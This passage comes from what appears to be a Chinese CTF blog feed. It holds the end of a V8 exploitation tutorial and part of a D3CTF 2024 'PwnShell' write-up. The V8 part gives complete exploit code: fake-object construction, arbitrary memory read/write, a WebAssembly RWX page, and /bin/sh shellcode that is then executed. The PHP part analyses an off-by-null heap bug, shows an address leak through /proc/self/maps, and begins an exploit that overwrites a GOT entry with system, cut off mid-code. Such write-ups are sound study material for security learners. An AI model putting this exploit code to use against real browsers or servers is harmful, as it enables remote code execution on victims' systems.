ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// æ²¡æœ‰åŸå‹</span></span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>ååˆ†ç®€å•çš„å…¥é—¨äº†ä¸€ä¸‹ <code>v8</code> æ¼æ´åˆ©ç”¨ï¼Œè¯¥ç±»æ¼æ´ä»¥åŠåˆ©ç”¨æ–¹å¼è¿˜æœ‰å¾ˆå¤šï¼Œçœ‹æ¥æœ‰çš„å­¦äº†<br>ä»Šå¤© <code>Csome</code> å­¦é•¿åœ¨ <code>defcon</code> æ‹¿äº†ä¸€è¡€ï¼Œå¤ªç‰›æ‹‰  </p><img src="/2024/05/05/v8start/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å“ï¼Œæˆ‘ä¹Ÿæƒ³æˆä¸ºåƒä»–é‚£ä¹ˆå¼ºï¼Œè¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°å•Šã€‚mdï¼Œä¸è¯´é‚£ä¹ˆå¤šäº†ï¼Œå¼€å·ï¼ï¼ï¼<br>å‚è€ƒï¼š<br><a href="https://www.anquanke.com/post/id/267518">https://www.anquanke.com/post/id/267518</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/130124693">https://blog.csdn.net/qq_45323960/article/details/130124693</a><br><a href="https://blog.csdn.net/weixin_46483787/article/details/134934993">https://blog.csdn.net/weixin_46483787/article/details/134934993</a><br><a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>D3CTF 2024</title>
      <link href="/2024/04/29/d3ctf2024/"/>
      <url>/2024/04/29/d3ctf2024/</url>
      
        <content type="html"><![CDATA[<h1 id="PwnShell"><a href="#PwnShell" class="headerlink" title="PwnShell"></a>PwnShell</h1><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å¾ˆä¹…ä»¥å‰å°±å¬è¯´è¿‡ <code>php pwn</code>ï¼Œæ²¡æƒ³åˆ°å°±åœ¨è¿™é‡Œé‡åˆ°äº†ã€‚å‡ºé¢˜äººè‡ªå·±å®ç°äº†ä¸€ä¸ª <code>php</code> æ‰©å±•æ¨¡å— <code>vuln.so</code>ï¼Œå¾ˆæ˜¾ç„¶æ¼æ´å°±æ¥æºäºè¿™é‡Œï¼Œé€šè¿‡é€†å‘åˆ†æå‘ç°å‡ºé¢˜äººåœ¨è¿™ä¸ªæ¨¡å—ä¸­å®ç°çš„èœå•å †ï¼Œå…¶æ¼æ´å‡½æ•°å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_addHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v11; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+8h] [rbp-40h] BYREF</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      v6 = &amp;chunkList[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">while</span> ( *v6 != <span class="number">1</span> )                        <span class="comment">// å¯»æ‰¾ç©ºé—²å †å—</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 += <span class="number">0x10</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[<span class="number">4</span> * v2];</span><br><span class="line">      v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL) + <span class="number">0x10</span>LL);<span class="comment">// v14å­—ç¬¦ä¸²é•¿åº¦+0x10</span></span><br><span class="line">      v9 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL));<span class="comment">// v15å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">      *v8 = v9;                                 <span class="comment">// å­˜v15çš„åœ°å€</span></span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL);<span class="comment">// v15å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">0x18</span>LL);<span class="comment">// v15å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€</span></span><br><span class="line">      v8[<span class="number">1</span>] = v10;                              <span class="comment">// å­˜v15å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);                     <span class="comment">// å¤åˆ¶v15å­—ç¬¦ä¸²å†…å®¹åˆ°v9ä¸­</span></span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8 + <span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">0x18</span>LL), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">0x10</span>LL);<span class="comment">// å­˜v14å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">      *(_QWORD *)v7 = v8;</span><br><span class="line">      v7[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">      *((_BYTE *)v8 + v13 + <span class="number">0x10</span>) = <span class="number">0</span>;          <span class="comment">// å­˜åœ¨off by null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v16 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆå¯¹éƒ¨åˆ†è¯­å¥è¿›è¡Œä»‹ç»ï¼Œé¦–å…ˆæ˜¯ä¸‹é¢è¿™æ®µä»£ç ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä½œç”¨æ˜¯è·å–å‡½æ•°çš„å‚æ•°ä¸ªæ•°ã€‚æ¥ä¸‹æ¥æ˜¯ <code>zend_parse_parameters</code> å‡½æ•°ï¼Œå…¶å‡½æ•°åŸå‹ä¸ºï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">END_API <span class="type">int</span> <span class="title function_">zend_parse_parameters</span><span class="params">(<span class="type">int</span> num_args, <span class="type">const</span> <span class="type">char</span> *type_spec, ...)</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ é€’çš„å‚æ•°ä¸ªæ•°ã€‚é€šå¸¸ä½¿ç”¨ <code>ZEND_NUM_ARGS()</code> æ¥è·å–ã€‚ ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒæŒ‡å®šäº†å‡½æ•°æœŸæœ›çš„å„ä¸ªå‚æ•°çš„ç±»å‹ï¼Œåé¢ç´§è·Ÿç€éœ€è¦éšå‚æ•°å€¼æ›´æ–°çš„å˜é‡åˆ—è¡¨ã€‚ å› ä¸º <code>php</code> é‡‡ç”¨æ¾æ•£çš„å˜é‡å®šä¹‰å’ŒåŠ¨æ€çš„ç±»å‹åˆ¤æ–­ï¼Œè¿™æ ·åšå°±ä½¿å¾—æŠŠä¸åŒç±»å‹çš„å‚æ•°è½¬åŒ–ä¸ºæœŸæœ›çš„ç±»å‹æˆä¸ºå¯èƒ½ã€‚<br>ä¸‹è¡¨åˆ—å‡ºäº†å¯èƒ½æŒ‡å®šçš„ç±»å‹ï¼š  </p><table><thead><tr><th>ç±»å‹æŒ‡å®šç¬¦</th><th>å¯¹åº”çš„Cç±»å‹</th><th>æè¿°</th></tr></thead><tbody><tr><td>l</td><td>long</td><td>ç¬¦å·æ•´æ•°</td></tr><tr><td>d</td><td>double</td><td>æµ®ç‚¹æ•°</td></tr><tr><td>s</td><td>char *, int</td><td>äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé•¿åº¦</td></tr><tr><td>b</td><td>zend_bool</td><td>é€»è¾‘å‹ï¼ˆ1æˆ–0ï¼‰</td></tr><tr><td>r</td><td>zval *</td><td>èµ„æºï¼ˆæ–‡ä»¶æŒ‡é’ˆï¼Œæ•°æ®åº“è¿æ¥ç­‰ï¼‰</td></tr><tr><td>a</td><td>zval *</td><td>è”åˆæ•°ç»„</td></tr><tr><td>o</td><td>zval *</td><td>ä»»ä½•ç±»å‹çš„å¯¹è±¡</td></tr><tr><td>O</td><td>zval *</td><td>æŒ‡å®šç±»å‹çš„å¯¹è±¡ã€‚éœ€è¦æä¾›ç›®æ ‡å¯¹è±¡çš„ç±»ç±»å‹</td></tr><tr><td>z</td><td>zval *</td><td>æ— ä»»ä½•æ“ä½œçš„zval</td></tr></tbody></table><p>ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure><p>è¯¥è¡¨è¾¾å¼åˆ™æ˜¯è·å–ä¸¤ä¸ªå‚æ•° <code>str</code> å’Œ <code>n</code>ï¼Œå­—ç¬¦ä¸²çš„ç±»å‹æ˜¯ <code>s</code>ï¼Œéœ€è¦ä¸¤ä¸ªå‚æ•° <code>char *</code> å­—ç¬¦ä¸²å’Œ <code>int</code> é•¿åº¦ï¼›æ•°å­—çš„ç±»å‹ <code>l</code> ï¼Œåªéœ€è¦ä¸€ä¸ªå‚æ•°ã€‚<br>ç°åœ¨é‡æ–°å›åˆ°é¢˜ç›®çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ª <code>off by null</code> æ¼æ´ï¼ˆæ³¨é‡Šé‡Œé¢æœ‰å†™ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬å°±è¦å…ˆè®¤è¯†ä¸€ä¸‹ <code>php</code> çš„å †ç»“æ„ã€‚<code>php</code> çš„å †ç»“æ„ç±»ä¼¼äº <code>libc 2.27</code> çš„ <code>tcache</code>ï¼Œ åœ¨ <code>tcache</code> çš„åŸºç¡€ä¸Šåˆ å»äº† <code>head</code> å¤´ã€‚ç”±æ­¤å¯è§ï¼Œ<code>php</code> çš„å †è¿˜æ˜¯æŒºå¥½åˆ©ç”¨çš„ã€‚ç”±äº <code>vuln.so</code> æ¨¡å—çš„ <code>RELRO</code> å¼€å¯çŠ¶æ€ä¸º <code>Partial RELRO</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>off by null</code> æ¼æ´å’Œå †é£æ°´ä¿®æ”¹å †å—çš„ <code>fd</code> æŒ‡é’ˆï¼Œå®ç°ä¿®æ”¹ <code>_efree</code> å‡½æ•°çš„ <code>got</code> è¡¨ä¸º <code>systemï¼Œ</code>ä»è€Œå®ç°ä»»æ„æŒ‡ä»¤çš„æ‰§è¡Œ<br>æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯å¦‚ä½•æ³„éœ²åœ°å€ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ª <code>linux</code> çš„çŸ¥è¯†ã€‚<code>linux</code> ç³»ç»Ÿå†…æ ¸æä¾›äº†ä¸€ç§é€šè¿‡ <code>/proc</code> çš„æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶è®¿é—®å†…æ ¸æ•°æ®ï¼Œæ”¹å˜å†…æ ¸è®¾ç½®çš„æœºåˆ¶ã€‚<code>/proc</code> æ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯ä»…å­˜åœ¨äºå†…å­˜ä¸­ã€‚<code>/proc</code> ä¸­ä¸€èˆ¬æ¯”è¾ƒé‡è¦çš„ç›®å½•æ˜¯ <code>sys</code>ã€<code>net</code> å’Œ <code>scsi</code>ï¼Œ<code>sys</code> ç›®å½•æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥è®¿é—®å’Œä¿®æ”¹å†…æ ¸çš„å‚æ•° <code>/proc</code> ä¸­æœ‰ä¸€äº›ä»¥ <code>PID</code> å‘½åï¼ˆè¿›ç¨‹å·ï¼‰çš„è¿›ç¨‹ç›®å½•ï¼Œå¯ä»¥è¯»å–å¯¹åº”è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¦å¤–è¿˜æœ‰ä¸€ä¸ª <code>/self</code> ç›®å½•ï¼Œç”¨äºè®°å½•æœ¬è¿›ç¨‹çš„ä¿¡æ¯ã€‚ä¹Ÿå³å¯ä»¥é€šè¿‡ <code>/proc/$PID/</code> ç›®å½•æ¥è·å¾—è¯¥è¿›ç¨‹çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•éœ€è¦çŸ¥é“è¿›ç¨‹çš„ <code>PID</code> æ˜¯å¤šå°‘ï¼Œåœ¨ <code>fork</code>ã€<code>daemon</code> ç­‰æƒ…å†µä¸‹ï¼Œ<code>PID</code> å¯èƒ½è¿˜ä¼šå‘ç”Ÿå˜åŒ–ã€‚æ‰€ä»¥ <code>Linux</code> æä¾›äº† <code>self</code> ç›®å½•ï¼Œæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸è¿‡ä¸åŒçš„è¿›ç¨‹æ¥è®¿é—®è¿™ä¸ªç›®å½•è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº <code>/proc/</code> æœ¬è¿›ç¨‹  <code>PID</code> ç›®å½•ä¸‹çš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ <code>self</code> ç›®å½•ç›´æ¥è·å¾—è‡ªèº«çš„ä¿¡æ¯ï¼Œä¸éœ€è¦çŸ¥é“ <code>PID</code>ã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬è¿™é‡Œåªéœ€è¦è¯»å– <code>/proc/self/maps</code> æ–‡ä»¶å³å¯ã€‚ç„¶åï¼Œåœ¨è¾“å‡ºä¸­å¾—åˆ° <code>libc</code> åœ°å€å’Œ <code>vuln.so</code> çš„åœ°å€ã€‚<br>è¿™é‡Œï¼Œè¿˜éœ€è¦ç”¨åˆ° <code>php</code> çš„ä¸€ä¸ªæŠ€å·§ï¼Œå³ <code>ob</code> å‡½æ•°ã€‚åœ¨ <code>php</code> ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>ob_start</code> æ¥æ‰“å¼€ç¼“å†²åŒºï¼Œç„¶åç¨‹åºçš„è¾“å‡ºæµå°±ä¼šè¢«å­˜å‚¨åˆ°å˜é‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>ob_get_contents</code> æ¥è·å¾— è¾“å‡ºæµï¼Œç„¶åé€šè¿‡æ­£åˆ™åŒ¹é…ä»è¾“å‡ºæµä¸­è·å¾—åœ°å€ã€‚<br>è¿™éƒ¨åˆ†å¯ä»¥å½“ä½œæ¿å­æ¥ç”¨ï¼Œå°±åƒè¿™ä¸€é“é¢˜ç›®ç”¨äºæ³„éœ²åœ°å€çš„ä»£ç ä¸ºï¼š  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>expï¼š  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>;<span class="variable">$i</span> &gt;= <span class="number">0</span>;<span class="variable">$i</span>--) <span class="variable">$hex</span>.= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span 